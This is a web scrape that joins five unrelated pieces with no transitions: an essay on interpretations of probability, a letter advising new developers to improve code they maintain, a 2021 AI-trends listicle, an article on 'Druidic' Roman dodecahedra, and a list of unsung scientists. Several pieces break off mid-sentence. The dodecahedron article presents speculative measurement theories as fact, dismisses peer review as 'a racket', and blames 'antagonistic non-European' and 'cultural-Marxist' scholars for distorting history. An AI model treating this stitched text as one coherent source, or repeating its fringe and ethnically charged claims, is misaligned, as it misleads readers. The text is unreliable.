<p>Within the realm of abstract mathematics, we’re free to model probability in a way that fits our intuitions. Imagine a multiverse containing an infinity of possible worlds, whose total <em>measure</em> is 100%. Define the probability of an <em>event</em>, such as that of rolling a nine, to be the measure assigned to the subset of worlds in which the event actually occurs.</p>

<p>In the abstract formalism, we’re allowed to assign the measure however we like, subject to Kolmogorov’s axioms: the measure must be non-negative, countably additive, and total to 100%. By respecting the symmetry of an idealized die,<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> we might argue that only one such assignment makes sense; from it, we can calculate the probability of any event involving dice rolls.</p>

<p>There are two shortcomings to this approach. Firstly, we won’t always deal with nicely symmetrical objects for which direct a priori arguments are possible. Thus, we still need a means of testing probabilistic claims using real-life observations. Secondly, such arguments can never be airtight: after all, how can we hope to infer the measure on a hypothetical multiverse, when we only ever experience <em>one</em> world? Indeed, a realist might question if it makes any sense to discuss the chances of an event happening: either it happens or it doesn’t!</p>



<p>You might be more trusting of someone who puts their money where their mouth is. To back up a definite claim, not involving chance, I can simply agree to pay a penalty if it turns out I’m wrong.</p>

<p>This idea can be extended to probabilistic claims in the following manner: consider a lottery that pays a $90 jackpot if the next roll of a pair of dice yields a nine. If the maximum that I’m willing to pay to play is $10, this indicates that I believe a not-nine roll is eight times more likely than a nine roll. This approach is appealing because, after all, the <em>raison d’être</em> of probability theory is to explain the decision-making of individuals facing uncertainty.</p>

<p>If another gambler’s view conflicts with mine, you may aggregate our beliefs by creating a market on which we buy and sell predictions. Consider a contract that pays $100 (plus interest) when a specified event occurs. Its price on the market can be interpreted as the percentage probability of that event. Thus, to say an event is twice as “likely” as another, simply means its market price is double.</p>

<p>Unlike your typical gambler, a frictionless market offers transparent near-identical buy and sell prices. As a result, any violations of Kolmogorov’s axioms become money-making arbitrage opportunities. Arbitrage activity acts as an enforcer of the axioms, creating what economists call the <em>risk-neutral probability measure</em>.</p>

<p>In real markets, however, this probability measure exhibits several inconsistenties. Firstly, it depends on which currency is used: as an extreme example, we wouldn’t buy a dollar-denominated wager that only pays out if the dollar collapses, no matter how likely we imagine the collapse to be. Secondly, this measure is sensitive to (non-diversifiable) risk: if a widely-believed prophecy held that rolling a nine would induce a catastrophic famine, the market would value this outcome a lot more, because everyone wants to buy insurance against such a catastrophe. Thirdly, markets can be misinformed: indeed, one motivation for participating in a market is to try to beat it! And finally, liquid markets are hard to set up.</p>

<p>For these reasons, we abandon this approach. We’ll seek to define probability in terms of actual outcomes instead of human bets. Nonetheless, human bets are what inspired the creation of probability theory: it’s hard to think of any other practical application! Therefore, we should remember to revisit the matter once we’ve found an appealing probability concept. Ultimately, we must be able to explain <em>how</em> individuals and markets behave with respect to our concept, and answer <em>why</em> they should care about it at all.</p>

<p>These questions are incredibly subtle: the theory of evolution by natural selection tells us that individuals are wired to use strategies that enabled their ancestors’ survival; however, the nature of probabilistic beliefs is that a wide range of outcomes are plausible. Indeed, while a coin will always land heads or tails, it’s considered unwise to bet your life savings on either heads or tails. Intuitively speaking, the rationale is that you’re almost certain to lose <em>eventually</em>, if you keep playing this way. This idea of repeated trials inspires our next interpretation, which happens to be the most popular among scientists.</p>



<p>According to the frequentist school of thought, a probabilistic statement is not to be taken literally. Although it refers to a single event, the statement should be taken as shorthand for a claim involving a very large collection of similar events. Imagine rolling the dice over and over. The probabilistic claim that we started with is converted into the following:</p>

<p>“<em>If a pair of standard dice are thrown repeatedly, then in the limit as the number of throws goes to infinity, the proportion of nines converges to one in nine (about 0.11 or 11%).</em>”</p>

<p>The short-run probability is replaced by a long-run proportion. Given an infinite sequence of rolls, this statement unambiguously reveals itself to be true or false. In light of the frequentist interpretation, we can even make more sense of our earlier interpretations. While we only experience one world, repeating an experiment under similar conditions is like observing the experiment in a parallel universe: whether we count trials or worlds, the math is virtually identical. In the limit of infinitely many bets, we can make some unambiguous conclusions about the quality of a gambler’s strategy, too: this is how casinos ensure that the house always wins!</p>

<p>Testing our claim is a simple matter: we roll the dice, over and over, and over and over… infinity times. Oops. Of course, there is no such thing as an experiment with infinity trials. Our arms will get tired, the dice will wear out, the Sun will explode, and all the free energy in the universe will be consumed. At best, we can do a very large number of trials. Let’s say we roll dice 9,000 times; one in nine of these would be 1,000. Perhaps we won’t roll exactly 1,000 nines, so let’s interpret our claim with a suitable margin of error, called a <em>confidence interval</em>:</p>

<p>“<em>If a pair of standard dice are thrown 9,000 times, then the face-up sides will sum to nine for between 920 and 1,080 of the throws.</em>”</p>

<p>The probability of obtaining between 920 and 1,080 nines can be calculated to be 99.3%.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Thus, we’ve turned a probabilitic statement into a much more certain but still probabilistic statement. If we observe 1,100 nines, we should be able to dismiss the probabilistic claim as false. And yet, if every household on Earth were to independently perform this 9,000-throw experiment, we should expect that a great many of their results would fall outside the confidence interval. They would disagree on the truth of our statement!</p>

<p>There’s no getting around it: despite its intuitive appeal, the frequentist definition of probability is circular, reducing probability claims to probability claims.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> To end the cycle, the frequentist chooses a threshold (say, 99%) beyond which to treat events as objective truths. This grants the claim an empirically observable meaning. And yet, the frequentist must take care not to consider too many such events, for otherwise the probability of <em>at least one</em> of the events failing may ALSO exceed the threshold of certainty: a logical contradiction.</p>

<p>Things only work out nicely in the limit of infinite sample size. Statisticians mainly deal with experiments which can be repeated so many times that, for most practical purposes, their conclusions can be treated as definite. Non-philosophers are usually happy to ignore a sub-1% chance of error; and if that’s not good enough, make it 0.0001%! Confidence can be increased by gathering more data, i.e., increasing the sample size.</p>

<p>This approach turns out to be very powerful. By designing more complex hypotheses in which probabilities vary as a function of context variables, even some phenomena that aren’t easily repeatable can be statistically analyzed. For example, weather forecasts are based on well-tested models that use measurements of variables such as temperature, pressure, humidity, and wind.</p>

<p>On the other hand, statistical models of sports games, democratic elections, or company stocks tend to be less testable: the interactions are very complex and there are too few outcomes from which to extrapolate. Similarly, when you try to predict which colleges will admit you or which of your friends will start a business, you don’t make your case using repeatable tests. Clearly, the frequentist interpretation cannot apply. One may argue that no conclusions in these cases would hold up to a scientific standard; nonetheless, if we seek a theory of decision-making under uncertainty, there’s no …</p></div></article></div></div></div>

<p>Dear new developer,</p>



<p>I’ve spent a lot of my time maintaining working code. I think that is more typical of software developers than working in greenfield development. Yes, there are definitely jobs where you are writing more new code than maintaining, upgrading, bug fixing and improving old code (startups without product market fit being one, consulting being another) but in general code is expensive and folks want to run it for a long time. </p>



<p>Often you’ll jump into code to fix a bug, investigate an issue or answer a question.</p>



<p>When you do so, improve it. This doesn’t mean you rewrite it, or upgrade all the libraries it depends on, or rename all the variables. </p>



<p>You don’t need to transform it. </p>



<p>But you should make it better. Just clean it up a bit. Doing so makes everyone’s lives just a bit better, helps the codebase in a sustainable way, and assists the business by making its supporting infrastructure more flexible.</p>



<p>What are some ways to improve the code when you are in it?</p>



<p><strong>Document</strong></p>



<p>Whether that is a comment that explains something tricky, a larger piece of documentation external to the code which explains how to interact with it, or fixing a typo, trustworthy documentation is key to interacting with code. This is a good way to start improving a codebase because it has minimal impact on the actual code. Therefore it is low risk. But if you’ve ever had a great comment explain a confusing bit of code, you’ll appreciate the time this effort can save.</p>



<p>You can also help documentation by removing old, crufty docs. If you see a comment that doesn’t apply, remove it. If there’s cut and paste documentation which doesn’t apply, get rid of it. That cleans up the code for the next person to come along (who might be you).</p>



<p><strong>Write a test or improve a test</strong> </p>



<p>Tests help you write maintainable, extensible code that others can change fearlessly. If you run across code that isn’t tested and you have time and the supporting framework to write one, do so. </p>



<p>Even if it tests simple functionality such as “can I instantiate this object” or “how does this function react when I pass it two null values”, an additional test will help the robustness of the code. </p>



<p><strong>Refactor it</strong></p>



<p>This is one of the most flexible improvements. Refactoring code can range from renaming a variable to be more true to its nature to an overhaul of an entire module. Start small and don’t get wrapped up in perfection. Make the code clearer in intent. </p>



<p>It’s easy with refactoring to get wound around an axle and make too many changes and end up with broken things. Timeboxing is one technique I use to avoid, or at least minimize, my tendencies toward this when refactoring. If all I have is 30 minutes, I’ll make my changes smaller in scope.</p>



<p>A warning about refactoring. Don’t refactor what you don’t understand. Don’t drive by refactor. Discuss your plan with someone more familiar with the code; <code>git blame</code> is your friend. Especially if the code is not well tested, you want to make sure you don’t do more harm than good.</p>



<p><strong>Upgrade a dependency</strong></p>



<p>It’s sometimes a winding path, but upgrading your dependencies regularly is a good way to maintain the code. I remember working in a fork of struts. It was an important application for the company, but we didn’t spend the time upgrading the dependencies, because it was too painful. Eventually, parts of the code became harder to update. The entire application couldn’t benefit from newer technologies and paradigms because of the older dependencies holding it back. </p>



<p>It never feels good to spend time updating a dependency; to me this always feels like running in place. But if you don’t do so, eventually dependencies will end of life and you’ll be forced to update. That’ll be even less pleasant. </p>



<p><strong>How to do it</strong></p>



<p><em>Based on feedback (<a href="https://www.reddit.com/r/programming/comments/k2cbtb/always_leave_the_code_better_than_you_found_it/gdv0kg9/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">this comment</a>, among others), I added this section on Nov 28.</em></p>



<p>When you are making these changes to improve the code, you’ll help out code reviewers and your future self by making changes that are improving the code separate from changes that add functionality. Whether you do this in separate pull requests, tickets, or commits depends on your team culture. Ask about that. But such separation will make it easier for people who aren’t familiar with the changes to understand them and give feedback on them, whether that is a code review this week or someone reviewing this component two years from now.</p>



<p><strong>Why do it</strong></p>



<p>All of these actions not only help others because they improve the quality of the code, they also provide examples to other developers on how to do so. For example, it is far easier to write the second test in a suite than the first. You can cut and paste a lot of the setup code and tweak only what is different. The first bit of documentation will inspire more.</p>



<p>Code isn’t everything, but it is an important work output. Whenever you touch it, you should strive to leave it in a better place that it was before you did so.</p>



<p>Sincerely,</p>



<p>Dan</p>

                        <p>Artificial intelligence and its subdomain Machine Learning (ML) have been showing promising trends over the past few years. At one side, AI is transforming the way of living and human interactions almost in every industry at large scale. On the other side the restrictions and polices imposed during COVID-19 pandemic has turned out to be an advantage for AI to grow. Given the lockdown situation and businesses turning towards digital transformation, AI has emerged as only futuristic technology that is not only solving and automating manual business workflows but also helping in <a href="https://thinkml.ai/top-5-cost-cutting-artificial-intelligence-ai-use-cases-in-banking-and-finance/">reducing the cost</a>. Year 2020 has witnessed many unique platforms, researches and tools that utilize AI to great extent, but year 2021 has promised much more and quite rightly called as the <strong>golden year</strong> for AI implementation.</p><p>Read also: <a href="https://thinkml.ai/top-10-ai-trends-to-watch-in-2020/">Top AI trends for year 2020</a></p><p>The global AI market size was calculated as $39.9 Billion in 2019 and expected to achieve <a href="https://www.grandviewresearch.com/industry-analysis/artificial-intelligence-ai-market">compound annual growth rate</a> (<strong>CAGR</strong>) up to 42.2% from 2020 to 2027. Technology has made innovations in big fields like healthcare, retail, automobile, and finance with continuous research. AI is one significant element that is promising to dominate and transform the digital era entirely with high accuracy and precision.</p><p>In this article, we have come up with <strong>Top 10 Artificial Intelligence Trends to watch in year 2021</strong>. These have the potential to hit great innovation in future. Let's have a look at these strategies:</p><h2 id="1-robotic-process-automation-rpa-">1. &nbsp;Robotic Process Automation (RPA)</h2><p>It's one of the most disruptive AI technologies that help in performing repetitive manual tasks. It can efficiently perform a high-volume, repetitive task on the desktop without creating any mess. The work might be of invoicing a client. For it, the robot opens email via RPA, copy the given data into a CRM database and then collect data from another related database. It replies to that client with new data. Besides, it can perform the given task multiple times in a day and saves human’s time to do some other productive task.</p><p>Robotic Process Automation is a robot that works on using software for performing repetitive manual tasks. If there is something beyond the knowledge of robot, it notifies its owner to step in. in a nutshell, RPA performs the mundane task and give time to people for more exciting work.</p><p>RPA would be in use in billing, invoicing, payroll processing, extracting data, tracking, and shipment scheduling. Its also known as <strong>Hybrid Workforce </strong>that shows the collaboration of human workforce with robots.</p><p><strong>Vanguard </strong>is a financial service providing company that comes <a href="https://about.vanguard.com/who-we-are/fast-facts/">$5.6 trillion</a> in global assets under management department. The company uses <a href="https://www.cio.com/article/3048318/roboadvisors-stand-at-the-vanguard-of-human-machine-collaboration.html">RPA</a> for doing exceptional trading tasks. It works with, "when x happens, do y." However, the RPA system cannot eliminate the need for humans. The combination of humans and technology helps in providing better services to clients and allowing humans to focus on complex tasks.</p><h2 id="2-ai-in-healthcare">2. &nbsp;AI in Healthcare</h2><p>AI is already helping the healthcare industry to a great extent with high accuracy, but further advancements will surprise everyone. AI developing companies are struggling hard to create advanced tools for enhancing the health industry’s capabilities—AI-inspired humans in recovering patients from recent pandemic COVID-19. <a href="https://www.techopedia.com/definition/27745/big-data">Big Data</a> was used to identify COVID Patients and significant hot spots. Moreover, researchers developed thermal cameras and <a href="https://www.techopedia.com/definition/2953/mobile-application-mobile-app">smartphone apps</a> for measuring the temperature of individuals and collecting data for healthcare organizations.</p><p>AI can help healthcare department in many unique ways by using data analysis and predicting different results. AI and ML tools provide insights about human health and also suggest preventive measures to stop the disease spreading. There is another AI trend; AI Watches that can help doctors to track their patient’s health remotely.</p><h3 id="predicting-pandemic-even-before-it-s-start">Predicting Pandemic Even Before It’s Start</h3><p>Now researchers are working on advanced AI algorithms for accurately predicting future outbreaks. Some of the significant research is already done on it that generated some earliest alerts about the current pandemic. In Wuhan, China, the <a href="https://www.cnbc.com/2020/03/03/bluedot-used-artificial-intelligence-to-predict-coronavirus-spread.html"><strong>BlueDot Tool</strong></a><strong> </strong>by Toronto was scanning over 100,000 governmental and media data daily and shared an alert about the potential pandemic.</p><h2 id="3-ai-for-cybersecurity-data-breaches">3. &nbsp;AI for Cybersecurity &amp; Data Breaches</h2><p>The use of advanced AI tools will collect and analyze a wide range of data sets. It will fetch information from news, blogs, websites, and stories to identify all threats. As it collects more data, the system will become more precise.</p><p>In 2021 and beyond, digital data will be at more risk to be hacked and vulnerable to phishing attacks. AI and advanced technologies will provide support to the security department against malicious activities in every field. AI will help to prevent cybercrimes in future with enhanced enterprise <a href="https://thinkml.ai/use-of-artificial-intelligence-in-cybersecurity/">cybersecurity</a> measures. The AI-supported system will spot fake digital activity or transactions that follow criminal patterns.</p><p>Its preventive alarms will protect sensitive data information from data hacking firms. Furthermore, it will take only a few seconds to detect any threatening activity, including suspicious IP addresses. It allows security dealers to respond to these activities faster than usual. Because of its high efficiency and advantages, the demand for AI in cybersecurity will rise in 2021.</p><h2 id="4-natural-language-processing-nlp-">4. &nbsp;Natural Language Processing (NLP)</h2><p>Here machine learning models teach computers to understand what's written or spoken material describing a specific process. It becomes one of the top and highly-demanded application of AI in the present time. The popularity of NLP is rising because of its significant usage as Amazon Alexa and Google Home. NLP eliminated the need for writing or interacting with a screen as now humans interact with robots that understand their language.</p><p>Natural Language Processing comes with two sub-applications.</p><p><strong>Natural Language Understanding: </strong>As its name shows, it enables a machine to review a written text and understands its meaning correctly.</p><p><strong>Natural Language Generation: </strong>It’s a logical response that a machine generates for any given input, for instance, any text.</p><p>The use of NLP will increase in 2021 for sentiment analysis, machine translation, summarizing a process, auto-video caption generation and as chatbots.</p><p>YouTube uses NLP technology in generating captions automatically across its platform. YouTube Video involves a <strong>speech recognition software </strong>that produces video cations. The system used this technology first in 2009 for translation of dozens of languages.</p><h2 id="5-reinforcement-learning">5. &nbsp;Reinforcement Learning</h2><p>Reinforced Learning (RL) is one of the demanded skills of future by different organizations. It's a particular application of deep learning that works based on its experience for improving data's effectiveness.

<p><strong>DECODING THE DRUIDIC DODECAHEDRON </strong></p>

<p><img src="http://www.celticnz.co.nz/OrgImages/Dodecahedron/Dodecahedron%20Types.jpg" width="900" height="438"></p>
<p><strong>These bronze artefacts are so-called <em>Roman</em> dodecahedra (plural of dodecahedron)  of which about 120 have been found in the Celtic countries of Europe. Strangely, none of these have been found in Italy, home turf of the Romans.</strong> <strong>To the left is seen a dodecahedron from the Römermuseum Schwarzenacker, Homburg, Germany collection. To the right is seen another pristine example from the Hunt Museum in Limerick Ireland </strong></p>

<p><img src="http://www.celticnz.co.nz/OrgImages/Dodecahedron/Dodecahedron%20Types3.jpg" width="935" height="438"></p>
<p><strong>To the left is a dodecahedron from Archaeological  Service Canton Aargau, Brugg, Switzerland (Vindonissa Museum). To the right is a dodecahedron from the Gallo-Roman Museum, Tongeren, Belgium. </strong></p>
<p>The basic design of these artefacts remains relatively constant (12 pentagonal faces with knop-shaped legs), however, there can be a range of different  incised designs in the layout of the faces<strong>. </strong></p>
<p>The actual function of these artefacts cannot be explained by our historians or archaeologists, although many theories abound,  none of which seem particularly convincing. Also, there is no  mention of these items in old historical records of the Romans or those of anyone else for that matter. They are such an enigma that academics have pretty-much come to the defeatist conclusion that <em><strong>"we will never know what these dodecahedrons were used for". </strong></em></p>
<p>In reviewing the academic literature, one begins to see why the mystery will probably never be solved within that community. Here are some of the impediments and pitfalls our experts create for themselves:</p>
<p>All archaeological measurements are given in metric increments (centimetres or millimetres), which is a modern system that was created as much as 2000-years after some of these dodecahedra were cast in bronze. Earlier exemplars in stone or wood could predate the latter, more refined ones, by yet another thousand years or more. This  metric measurement preoccupation renders the  encoded numbers invisible or unrecognisable. Our academics know a large swathe of the ancient measurements that were in use two thousand years ago or before, so why not apply them to this study? </p>
<p>Most assuredly, the various sized holes in the 12-faces, the concentric circles that circumnavigate them, as well as the additional incised lines or dotted circles, etc, infer that there is something vividly measurable going on and it's evident that each hole or ring  has been very purposely fabricated to represent a known, precise and sought-after measurement.</p>
<p><img src="http://www.celticnz.co.nz/OrgImages/Dodecahedron/Calibrated.jpg" width="900" height="476"> </p>
<p><strong>A number of dodecahedra have calibration marks along their edges or around the holes in their faces. To the left is seen a calibrated dodecahedron from Hereford Museum, Kenchester and to the right is seen another from Goodrich Castle. Yet another one found in Wales shows etched calibration marks. </strong></p>
<p>In their reports,  archaeologists will often round out measurements of the holes in the dodecahedron faces to the nearest millimetre only, which is grossly insufficient. It's much appreciated by researchers when measurements can be supplied to 1/10th  of a millimetre, but  it is nigh on impossible  to acquire more refined measurements undertaken with electronic vernier callipers. Precise measurements and scaling must precede any serious analysis of these artefacts, but our experts don't seem to think there would be anything significant to find anyway, so don't subject the dodecahedra to rigorous measurement analysis.</p>
<p>Despite the fact that 25.4 millimetres (1 British Standard Inch) or fraction expressions of the same will recur repeatedly in the faces of dodecahedra, no-one seems to have arrived at the conclusion that the enigmatic<em><strong> "inch"</strong></em> recurrence is worthy of serious investigation. </p>
<p>Almost anything considered high-art, technically advanced or an engineering feat within ancient European civilisations seems to be automatically attributed to the Romans, which is certainly the case for these dodecahedra artefacts. This  is a hangover of biased, classicist-isolationist historical  interpretations of  European history where, first came the  Roman conquerors, who finally retreated after centuries of domination, only to be replaced by Rome's State church. With the pedigree of the church being Greco-Roman it was in their interests to push the concept that the Roman armies had found everything in the regions they invaded to be backwards, rudimentary or crude until Rome delivered the great-unwashed masses out of their depravity and into  enlightenment and high-civilisation. </p>
<p>This general process of misattribution further hobbles or seriously limits proper investigation into the purpose and function of dodecahedra artefacts, inasmuch as focus is  directed, almost exclusively, to what Roman armies might have used them for as range-finders or other battle related paraphernalia, including club-heads. The druids or others don't get  any serious consideration, despite the fact that they are historically recorded as having been  advanced mathematicians and astronomers.</p>
<p>Within controlled academia the ability to do open-ended, ground-breaking research can be severely curtailed by the requirements of <em><strong>"peer review"</strong></em> by colleagues.  This is largely a racket that ensures one doesn't move too far from the protected consensus opinion upon which academic reputations are built and anyone venturing too far out into left field is considered a maverick who threatens the insulated central body.</p>
<p>By the same token academia, these days, is lumbered with deep-set social responsibilities and crippling political agendas. When it comes to European history, especially, the requirement is to be self-effacing, while lauding and applauding the (often meager) accomplishments of other ethnicities. Under  guises of political correctness and racial sensitivity, the door is opened for antagonistic non-European, prejudiced individuals, to write and interpret  our history for us, while pushing their own  cultural-Marxist or similar wheel-barrows.  All one has to do is sit through lectures in our western universities to see just how far out of kilter the abysmal problem of  European history-misrepresentation has become.</p>
<p>But, with regards to the dodecahedra artefacts,what one person can build, another can generally duplicate or back-engineer, sufficient to make sense of what's going on. </p>
<p>So, let's cut to the chase, bypass all the  confusion of modern-day naysayers and source testimony directly from an observer who lived contemporary to the druids, before they fell under Roman domination </p>
<p>Julius Caesar, who was a very thorough historian, writes the       following regarding the late era druids of his time (circa 55 BC) and        practices within their many universities in Britain, where students from Gaul       and elsewhere, including Rome, went for training:</p>
<p><strong>'They hold aloof from war and do not pay war taxes; they       are excused from military service and exempt from all liabilities. Tempted       by these great advantages, many young men assemble of their own motion to       receive their training, many are sent by parents and relatives. Report says       that in the schools of the Druids they learn by heart a great number of verses,       and therefore some persons remain twenty years under training'. </strong></p>
<p><strong>'They do not think it proper to commit these utterances to       writing, although in all other matters and in their public and private accounts       they make use of Greek characters. I believe that they have adopted the practice       for two reasons- that they do not wish the rule to become common property,       nor those who learn the rule to rely on writing and so neglect the cultivation       of memory; and, in fact, it does usually happen that the assistance of writing       tends to relax the diligence of the student and the action of memory...They       also lecture on the stars in their motion, the magnitude       of the Earth and its divisions, on natural history, on the power and       government of God; and instruct the youth in these subjects' <em>(see De Ballo       Gallico, VII, 15, 16.).</em></strong></p>
<p>Historian, Isabel Hill Elder  writes, <strong>'The students at these       colleges numbered at times sixty thousand of the youth and young nobility       of Britain and Gaul. Caesar comments on the fact that the Gauls sent their       youth to Britain to be educated...It required twenty years to master the complete       circle of Druidic knowledge. Natural philosophy, astronomy,       mathematics, geometry, medicine, jurisprudence, poetry and oratory       were all proposed and taught-natural philosophy and       astronomy with severe exactitude' (Elder refers to <em>Strabo I IV,       page 197. Caesars Comm. Lib V. Sueotonius, V Calegula. E. Campion, Accounts       of Ireland, pg. 18.).</em></strong></p>
<p>Isabel Hill Elder further writes,<strong> 'The education system       adopted by the Druids is traced to about 1800 BC when Hu Gardarn Hysicion       (Isaacson), or Hu the Mighty, led the first colony of Cymri into Britain from       Defrobane, where Constantinople now stands'.</strong> </p>
<p>Further commenting on Hu       Gardarn Hysicion, Isabel Hill Elder writes that he, <strong>'is commemorated in       Welsh archaeology as having made poetry the vehicle of memory'.</strong> Elsewhere       she writes, he <strong>'is said to have mnemonically systematized the wisdom of       the ancients...'.</strong> She goes on to say,<strong> 'The published compositions of       the Druids and Bards form but a very small portion of the extant remains of       their works. The Myvyrian MSS. alone, now in the British Museum, amount to       47 volumes of poetry, in 1600 pages, besides about 2000 epigrammatic stanzas.       Also in the same collection are 53 volumes of prose, in about 15,300 pages,       containing many curious documents on various subjects...' <em>(see Celt, Druid       and Culdee, pages 54 &amp; 55).</em></strong></p>
<p>With the testimony of Julius Caesar ringing in our ears, lets see how the druids would have used the dodecahedron artefacts as <em><strong>"memory"</strong></em>devices for mathematically encoding astronomical cycles,<em><strong> ("the stars in their motion")</strong></em>, navigation systems <em><strong>("the …</strong></em></p></div>

			<p><span>I</span>t’s easy to name science and math geniuses. I can just flip open my old book from the 1960s, which lists “100 Great Scientists”; it contains all the names you’d find on most popular lists of scientific geniuses: Einstein, Newton, Maxwell, Gauss, Bohr, Archimedes, Darwin, Galileo, and 92 others. </p> <p>But the geniuses of popular notoriety aren’t the only great minds of scientific history. That book and other such lists overlook many deserving names—the unsung geniuses overshadowed by more publicity-savvy rivals or under-appreciated because of when and where they lived. Presented below are my Top 10 of those insufficiently recognized scientific geniuses of all time, listed in chronological order.</p> <p>Keep in mind that this is science and math only, so no <a href="http://nautil.us/issue/18/genius/shakespeares-genius-is-nonsense" target="_blank">Shakespeare</a>, no Bobby Fischer, no Lennon and McCartney. Also, nobody still living is eligible—wouldn’t want to hurt anybody’s feelings.</p> <p>And remember, for list-making purposes, genius shouldn’t simply be thought of as high IQ. It’s more a combination of intellectual capacity and what was achieved with it. Geniuses transcend the time in which they live, contributing insights that allow future scientists to be smarter than the geniuses of the past. All the people listed here did that.</p> <figure data-alt="Siegfried_BREAKER_BrahmaguptaGrosseteste.png" data-title="" data-capper="" data-credits=""><img src="http://static.nautil.us/4535_aee1bc7fa5da061b752d0efddbd16495.png" alt="" width="733"></figure> <p><b>10. Brahmagupta (India, 598-c.670)</b></p> <p>A prominent astronomer, Brahmagupta wrote an extensive treatise covering such topics as the motions of the planets, eclipses, and the phases of the moon. But his genius emerged most prominently in mathematics. He introduced the idea of zero as a number like any other and discussed how to calculate with it. He was also the first to explain negative numbers, a concept thought by the Greeks to be “absurd.” Brahmagupta pointed out that multiplying two negative numbers (he called them “debts”) produced a positive number (in his terminology, a “fortune”).</p> <p><b>9. Robert Grosseteste (England, c. 1170-1253)</b></p> <p>Grosseteste was a prominent churchman who served as the Bishop of Lincoln for the last 18 years of his life. But in his earlier days he was a master of all the sciences, from medicine to cosmology. In fact, he was among the first modern scientific thinkers of the Middle Ages. He respected Aristotle but taught that experiment took precedence over authority. Grosseteste was an expert in optics, considering light to be the fundamental substance of existence; its power gave the cosmos shape, pushing matter around to form the heavenly spheres. Roger Bacon, the more widely known scientific pioneer of the 13th century, held Grosseteste in the highest esteem, while dismissing most other big scientific names of the day as dimwits.</p> <figure data-alt="Siegfried_BREAKER_OresmeHarriot.png" data-title="" data-capper="" data-credits=""><img src="http://static.nautil.us/4536_cfbc6c5cfb8a3e10fab12aa3512153df.png" alt="" width="733"></figure> <p><b>8. Nicole Oresme (France, c. 1320-1382)</b></p> <p>One of the most sophisticated mathematicians of his era, Oresme worked out the logical demonstration that all observable evidence was consistent with the Earth’s rotating on its axis, rather than the sun actually rising and setting. His true genius, however, was in then stating that he didn’t really believe that the Earth rotated, so that he could keep in good standing with the church (he was a bishop) and not get put under house arrest or burned at the stake. </p> <p><b>7. Thomas Harriot (England, c. 1560-1621)</b></p> <p>Harriot was a master of many sciences, starting with his role as scientist for an expedition to Roanoke Island in 1585. Later in his life he became the preeminent mathematician in England, a pioneer in the establishment of algebra for both pure and applied math. As an astronomer, he observed features on the moon and spotted the moons of Jupiter, possibly even before Galileo. His works on optics included an analysis of the physics of rainbows. Most of his writings went unpublished in his lifetime; hence many later mathematicians rediscovered much that Harriot had already accomplished or foreseen.</p> <figure data-alt="Siegfried_BREAKER_ParentSomerville.png" data-title="" data-capper="" data-credits=""><img src="http://static.nautil.us/4537_26310c700ffd1b5095454f336ae96648.png" alt="" width="733"></figure> <p><b>6. Antoine Parent (France, 1666-1716)</b></p> <p>Parent applied his versatile intellect to a vast scope of scientific fields. He investigated physics and astronomy, cartography and geometry, chemistry and biology, and even music. He was most astute in analyzing practical matters such as friction’s effect on motion and stresses on structural beams, and attempted to compute the theoretical maximum efficiency of machines. For his exemplar he chose water wheels, widely used to harness the power of flowing streams for such tasks as sawing wood or milling grain. Parent got the wrong answer, but nevertheless laid the groundwork for the second law of thermodynamics. Parent’s harsh criticism of Descartes’ science earned him no friends among his French colleagues, though, who considered Parent to be tactless and aggressive. After he died of smallpox, one obituary writer commented that Parent “had goodness without showing it.”</p><div>

</div> <p><b>5. Mary Somerville (Scotland, 1780-1872)</b></p> <p>She was the Carl Sagan of the 19th century, one of the most respected and prolific popularizers of science of her age. Her one year of formal schooling (at age 10) triggered enough curiosity that she taught herself algebra and geometry (mostly in secret, as her father disapproved). She married and moved to London, but her husband died young, so she returned to Scotland and to science. When asked to translate Laplace’s works on celestial mechanics into English, she turned the translation into a popular explanation, launching a career of writing books that conveyed the cutting edge of 19th-century science to the wider literate public. Her work, universally praised by the scientific community, combined the genius of insight with the ability to convey it.</p> <figure data-alt="Siegfried_BREAKER_QueteletClifford.png" data-title="" data-capper="" data-credits=""><img src="http://static.nautil.us/4538_79fde5402cbc75ae0615c9ae4c335b46.png" alt="" width="733"></figure> <p><b>4. Adolphe Quetelet (Belgium, 1796-1874)</b></p> <p>As a youth, Quetelet dabbled in writing operas and poetry, but wisely switched to math, before becoming an astronomer and ultimately the most accomplished statistician of his day. Quetelet especially perceived the importance of statistical reasoning for the social sciences. He demonstrated how the prevalence of various crimes could be predicted, for instance. He also recognized the fallacies that improper statistical reasoning could propagate, noting that the numbers said nothing about any individual, but that nonetheless the statistical construction of an “average man” could reveal much about society as a whole. Also, to the benefit (or annoyance) of many dieters, he developed the formula for Body Mass Index, so that you can properly quantify how overweight you are. </p> <p><b>3. William Kingdon Clifford (England, 1845-1879)</b></p> <p>A brilliant mathematician, Clifford was in ill health for most of his adult life and died at 33. Even so he earned international repute for his original approaches to geometry and other aspects of mathematics. His work foreshadowed aspects of Einstein’s general theory of relativity; Clifford pointed out that “some or all of those causes which we term physical may… be due to the geometrical construction of our space,” anticipating Einstein’s description of gravity as curvature in the geometry of spacetime, the combination of space and time implied by his special theory of relativity.</p> <figure data-alt="Siegfried_BREAKER_BorelNoether.png" data-title="" data-capper="" data-credits=""><img src="http://static.nautil.us/4539_edb684859b848362ec56904286947614.png" alt="" width="733"></figure> <p><b>2. Emile Borel (France, 1871-1956)</b></p> <p>By age 11, Borel’s genius was apparent enough that he left home to receive more advanced instruction and eventually made his way to Paris, where he observed that the most exciting and fulfilling lives were led by mathematicians. He became an enormously productive scholar, with major contributions to set theory (the branch of math that studies the properties of collections of objects) and probability theory. And in the 1920s he established many of the fundamental principles of game theory (the math for calculating optimum strategies)—unknown to John von Neumann, who invented them all over again. </p> <p><b>1. Amalie Emmy Noether (Germany, 1882-1935)</b></p> <p>In the mid-19th century, several men figured out the law of conservation of energy, but it was Emmy Noether who figured out <i>why</i> energy is conserved. It’s a consequence of a symmetry in nature, specifically the symmetry of time—physical law remaining the same in the future as it has been in the past. What’s more, she showed that other symmetries also require conservation laws—symmetry in spatial direction guarantees conservation of angular momentum, for example. Noether contributed to many other realms of math, especially abstract algebra, and clarified some of the mathematical aspects of general relativity. Despite years of discrimination, she was eventually allowed to join the faculty at Göttingen, after the esteemed mathematician David Hilbert pointed out that the faculty senate was not a bathhouse.</p>  <p><i>Tom Siegfried is a freelance writer in northern Virginia and former editor in chief of</i> Science News.</p><p><i>This article first appeared online in our “Genius” issue in October, 2014.</i></p>

<p>
